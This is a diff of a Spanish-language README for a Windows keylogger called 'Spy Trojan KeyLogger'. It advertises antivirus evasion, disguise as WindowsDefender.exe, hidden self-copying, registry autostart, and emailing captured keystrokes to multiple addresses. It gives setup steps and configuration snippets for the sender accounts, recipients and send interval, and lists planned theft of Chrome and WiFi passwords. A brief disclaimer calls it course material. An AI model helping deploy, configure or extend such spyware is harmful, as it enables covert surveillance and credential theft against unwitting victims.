@@ -1,14 +1,15 @@
 ````
 █▀ █▀█ █▄█   ▀█▀ █▀█ █▀█ ░░█ ▄▀█ █▄░█   █▄▀ █▀▀ █▄█ █░░ █▀█ █▀▀ █▀▀ █▀▀ █▀█
-▄█ █▀▀ ░█░   ░█░ █▀▄ █▄█ █▄█ █▀█ █░▀█   █░█ ██▄ ░█░ █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v3.3.3     
+▄█ █▀▀ ░█░   ░█░ █▀▄ █▄█ █▄█ █▀█ █░▀█   █░█ ██▄ ░█░ █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v3.3.4     
 ````
 ---
 ---
 * __Nombre:__ `Spy Trojan KeyLogger`
-* __Versión:__ `3.4.0`
-* __Documentación:__ `17/05/2020`
+* __Documentación:__ `22/05/2020`
+* __Versión:__ `3.3.4`
+* __Estado:__` Estable`
 * __Plataforma:__` Windows 7, 8.1 y 10`
-* __Lenguaje:__`Python 3.8`
+* __Lenguaje:__` Python 3.8`
 
 
 __Nota importante:__ Esta herramienta tiene como proposito general y de uso exclusivo para aprendizaje, se creó como parte de un curso Online de hacking de __"Seguridad de sistemas informáticos"__, no me hago responsable de un posible mal uso de ésta herramienta.
@@ -27,36 +28,61 @@ Las razones por las cuales existen los Keyloggers, tienen como fin la seguridad 
 - `LICENCE` = Licencia 
 - `README.md`= Documentación
 - `version.txt` = Información detalla de conversión `.py` a `.exe`
-- `WindowsDefender.exe` = Keylogger Compilado `3.2.0`
+- `WindowsDefender.exe` = Keylogger Compilado `3.3.4`
 - `WindowsDefender.py` = Código fuente del Keylogger
 ---
 ---
 # Caracteristicas
-- __Indetectable Antivirus:__ Windows Defender `02/05/2020`, Avast, ESET NOD32
-- __Envío por Gmail:__ Envía el registro de teclas por Gmail en un `.k`.
+- __Indetectable Antivirus:__ Windows Defender `22/05/2020`, Avast, ESET NOD32
+- __Envío por Gmail:__ Envía el registro de teclas por Gmail en un `reg.k`.
 
   ![Correo ejemplo del Keylogger](https://i.imgur.com/HCyUK2M.png)
 
 - __Recibe datos por varios correos:__ Hay una posibilidad de agregar 1 o más correos, y así el registro de teclas se envíe a varios correos a la vez.
-- __Obtiene contraseñas guardadas en Google Chrome:__ Obtiene todas las contraseñas guardadas de Google chrome .
-- __Verifica conexión a internet:__ El keylogger verifica si la computadora está conectada a internet, y si ese es el caso envía los datos, en caso contrario, no lo envía,
-- __Tiempo de envío personalizado:__ Usted puede elegir un intervalo de tiempo personalizado, en la cual desea que se envíe los archivos, `No se recomienta que sean muy seguidos, ya que el servidor de mensajería de google, bloqueará la cuenta por 1 día,  por eso el tiempo de intervalo de envío escogida es de 2 Horas, éstas horas se cuentan despues de iniciar el script`
-- __Obtención de datos a prueba de errores:__ En otros keylogger al momento de enviar el `.k`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene el registro de teclas, en éste keylogger, ese error está solucionado.
-- __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por detalles de debuggeo, pero al ser compilada de `*.py` a `*.exe` el ejecutable resultante se ejecutará en segundo plano
-- __Disfraz:__ Al momento de ser convertido de `*.py a *.exe`. El Keylogger será disfrazado como `WindowsDefender.exe` con el ícono y la información del programa.
-- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `"C:\Users\Public\Security\Windows Defender\"` , y en esa carpeta encuentras el archivo `.k`.
 
-- __Iniciar automaticamente con el sistema:__ Modifica el registro de windows
+    ````py
+    #Correos que recibirán el registro de teclas.
+    def ReceiveE():
+        return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
+        #return ["CorreoReceptor@gmail.com"]                                         #Monocorreo        
+    ````
+- __Verifica conexión a internet:__ El keylogger verifica si la computadora está conectada a internet, y si ese es el caso envía los datos, en caso contrario, no lo envía,
+- __Intervalo de tiempo personalizado:__ Usted puede elegir un intervalo de tiempo personalizado, en la cual desea recibir el registro de teclas. `No se recomienta que sea un intervalo muy pequeño, ya que el servidor de mensajería de google, bloqueará la cuenta por 1 día,  por eso el tiempo de intervalo de envío escogida es de 2 Horas, este tiempo transcurre desde el  inicio del script`
+    ````py
+    def timeSend(): # Tiempo de envío perzonalizado
+        return 120    # Minutos                 <= Escoja su tiempo en minutos
+    ````
+- __Obtención de datos a prueba de errores:__ En otros keylogger al momento de enviar el `reg.k`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene ninguna información de teclas oprimidas, en éste keylogger, ese error está solucionado.
+- __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por detalles de debuggeo, pero al ser compilada de `*.py` a `*.exe` el ejecutable resultante se ejecutará en segundo plano
+
+    ![Segundo plano](https://i.imgur.com/DFAf2Tw.png)
+
+- __Disfraz:__ Al momento de ser convertido de `*.py a *.exe`. El Keylogger será disfrazado como `WindowsDefender.exe` con el ícono y la información del programa.
+    ![ExeCompilado](https://i.imgur.com/TlBEAaS.png)
+
+    ![StartUP Info](https://i.imgur.com/bkGSFQC.png)
+
+    ![Info](https://i.imgur.com/MQAiVnJ.png) 
+    ![Info](https://i.imgur.com/mTBByRy.png)
+
+- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `"C:\Users\Public\Security\Windows Defender\"` , y en esa carpeta encuentras el archivo `reg.k`.
+
+- __Iniciar automaticamente con el sistema:__ Modifica el registro de windows, [más información aquí.](https://github.com/SebastianEPH/SpyTrojan_Keylogger#m%C3%A9todo-de-infecci%C3%B3n)
+    
+    ![StartUp](https://i.imgur.com/xh91bR5.png)
+
 - __Segundo Gmail en caso de Error:__ En casó el correo principal sea bloqueada o tenga x problemas, se usará un segundo correo.
 
 
-## Caracteristicas en futuras actualizaciones: 
+## Caracteristicas que se agregarán en futuras actualizaciones: 
 - __Conexión a una base de datos MySQL:__ Los datos recopilados serán enviados por una conexión a una base de datos en vez de por mensajes.  
 - __Soporte de envió a otros buzones de correo:__ Se insertará un soporte para poder usar Outlook, yahoo u otros servicios de correo 
-- __Conexión FTP:__ Envía el archivo `.k` vía FTP.
+- __Conexión FTP:__ Envía el archivo `reg.k` vía FTP.
 - __Envía datos mediante FTP:__ enviará documentos, fotos y videos mediante una conexión FTP, en segundo plano.
+- __Envio mediante Bot Telegram:__ Soporte de envio automatico del registro de teclas a un bot especifico.
 - __Contraseñas de Wifi:__ Obtiene contraseñas guardadas en una laptop o PC
 - __Portapapeles:__ Obtiene el texto del portapapeles.
+- __Obtiene contraseñas guardadas en Google Chrome:__ Obtiene todas las contraseñas guardadas de Google chrome .
 
 ## Uso de Recursos de la PC
 El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
@@ -66,6 +92,9 @@ El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
 ---
 ---
 # Proceso de preparación:
+
+__NOTA:__ Como requisito mínimo para el aprendizaje de ésta herramienta es saber programar en __Python básico__.
+
 Requerimiento de paquetes de `Python3.8`:
 - `import pynput`
 - `import getuser`
@@ -82,30 +111,31 @@ Requerimiento de paquetes de `Python3.8`:
 2. Use  `git clone https://github.com/SebastianEPH/SpyTrojan_Keylogger.git` para descargar el repositorio en su computadora.
 
 3. Abra el archivo `WindowsDefender.py` en su editor de texto.
-4. Entre al codigo y busca la `ZONA CUSTOM` y modifique el `Correo primario` y el `Correo segundario`, luego rellene el o los `Correos que receptores`
+4. Entre al codigo y busca la `ZONA CUSTOM BÁSICA` y modifique el `Correo primario` y el `Correo segundario`, luego rellene el o los `Correos que receptores`
 ````py
-# **************************************   ZONA CUSTOM   *********************************
-
+# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
 # Correo de envío [Primaria] 
 def emailP():                   # <<== Cambia éste correo
-    return "Send123@gmail.com" 
+    return "correo1@gmail.com" 
 def passP():                    # <<== Contraseña del correo
-    return "contraseña1"
-
+    return "contra1"
 # Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
 def emailS():                   # <<== Cambia éste correo
-    return "Sendabc@gmail.com"
-def emailP():                   # <<== Contraseña del correo 
-    return "contraseña2"
+    return "correo2@gmail.com"
+def passS():                   # <<== Contraseña del correo 
+    return "pass2"
 
+def timeSend(): # Tiempo de envío perzonalizado
+    return 120 #Minutos                 <= Escoja su tiempo en minutos
 
-#Correos que recibirán los archivos log
+#Correos que recibirán el registro de teclas.
 def ReceiveE():
     #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
-    return ["Recibe1@gmail.com"]                                                # MonoCorreo
+    return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
 
-# ***************************************   FIN ZONA CUSTOM   *******************************
+# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
+
 ````
 [Si usted desea modificar el keylogger lea la siguiente documentación aquí.](Doc/CustomKey.md)
 ---
@@ -134,7 +164,8 @@ ___
 <!-- Creador  -->
 ---
 ## By SebastianEPH
+<!--- [Website](https://sebastianeph.github.io/) -->
 - [Github](https://github.com/SebastianEPH)
-- [Facebook](https://www.facebook.com/SebastianEPH)
 - [Linkedin](https://www.linkedin.com/in/sebastianeph/)
 - [Telegram](https://t.me/sebastianeph)
+- [Facebook](https://www.facebook.com/SebastianEPH)
